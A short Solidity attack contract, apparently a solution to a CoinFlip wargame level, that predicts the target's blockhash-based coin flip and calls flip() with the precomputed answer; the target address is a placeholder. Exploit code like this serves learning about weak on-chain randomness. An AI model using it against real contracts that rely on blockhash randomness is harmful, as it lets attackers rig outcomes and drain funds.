// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface CoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract onedone  {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public object=CoinFlip(<Contract address here>);

    function getsecret() public returns(bool){
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip= blockValue/FACTOR;
        bool result = coinFlip == 1 ? true : false;
        bool plswork = object.flip(result);
        return plswork;
    }
}
